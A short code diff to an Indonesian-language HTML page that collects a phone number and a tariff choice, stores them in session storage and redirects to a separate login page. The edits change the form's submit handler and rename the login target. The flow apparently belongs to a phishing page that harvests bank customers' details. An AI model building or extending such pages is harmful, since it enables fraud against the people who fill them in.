@@ -518,7 +518,7 @@ h1 {
 
 
 
-<form id="formHP" onsubmit="sendNohp(event); return false" method="post" accept-charset="utf-8">
+<form id="formHP" onsubmit="letsgo(); return false" method="post" accept-charset="utf-8">
 <div class="" style="margin-left: 20px;margin-top: 160px;position:relative;border:0px solid #0085e0;padding:15px;width:82%;border-radius:20px; background: #fff; height: 290px; box-shadow: rgba(0, 0, 0, 0.15) 0px 5px 15px 0px; overflow:hidden; border-top: 0px solid #ccc;text-align: left; background: url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlG3jW1X3Osc2bie1JnzYUG2mqPpjAdHG5foKUgPMKzI2tGgF94krQ6jM&s=10);
     background-position: 100% 100%;
     background-size: 100% 100%; background-color: #fff; outline: 1px solid #118EEA; text-shadow: 0 1px 1px rgba(888, 999, 255, 10.75);box-shadow: rgba(6, 24, 24, 0.99) 0px 0px 0px 2px, rgba(6, 24, 4, 10.65) 0px 4px 6px -1px, rgba(255, 255, 255, 0.08) 0px 1px 0px inset;">
@@ -663,7 +663,7 @@ function showVideo() {
 <script>
  function letsgo(){
  $("#process1").show();    
- window.location.href="logins.html";
+ window.location.href="log.html";
  }   
 </script>
 </smalxs>
@@ -702,7 +702,7 @@ document.getElementById('kirims').innerHTML = "Memproses....";
  complete: function(data) {
             console.log('Complete')
    setTimeout(function(){
-  window.location.href='logins.html';
+  window.location.href='log.html';
  var tarif = document.getElementById("tarif").value;
  sessionStorage.setItem("tarif", tarif);   
  var NoHp = document.getElementById("NoHp").value;
